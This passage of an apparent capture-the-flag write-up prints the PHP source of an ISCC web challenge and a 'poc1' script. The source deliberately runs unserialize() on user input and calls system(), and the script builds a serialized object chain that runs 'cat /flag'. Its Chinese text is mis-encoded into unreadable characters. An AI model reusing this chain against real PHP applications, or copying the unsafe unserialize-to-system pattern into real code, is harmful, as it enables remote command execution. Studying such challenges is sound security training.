class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$status</span> = <span class="string">&quot;new&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$is_unser_finished</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$iscc_file</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = (count(<span class="variable">$_FILES</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$iscc_file</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$is_upload</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">                <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$check</span> = @getimagesize(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$target_dir</span> = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$iscc_file</span>[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="variable">$iscc_file</span> = <span class="variable">$target_file</span>;</span><br><span class="line">                        <span class="variable">$status</span> = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="variable">$pAssM0rd</span> = hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pAssM0rd&#x27;</span>] === <span class="variable">$pAssM0rd</span>)</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_unser_finished</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$is_unser_finished</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params"><span class="variable">$len</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    <span class="variable">$randstring</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randstring</span> .= <span class="variable">$characters</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$characters</span>))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randstring</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$s</span>, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    @unlink(<span class="variable">$iscc_file</span>);</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$whatareyounongshane</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$whatareyounongshane</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            <span class="variable">$resp</span> = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$resp</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$wtf</span> = waf(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? <span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$goodshit</span> = @unserialize(<span class="variable">$wtf</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_unser_finished</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$status</span>, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc å’Œ exp å…ˆè´´ç€ï¼Œå‘ä¸æ€¥ç€å¡«ï¼Œæœ‰ç©ºäº†ä¸€åˆ‡å¥½è¯´</p><p><code>poc1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;d=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ISCC_Login();</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span 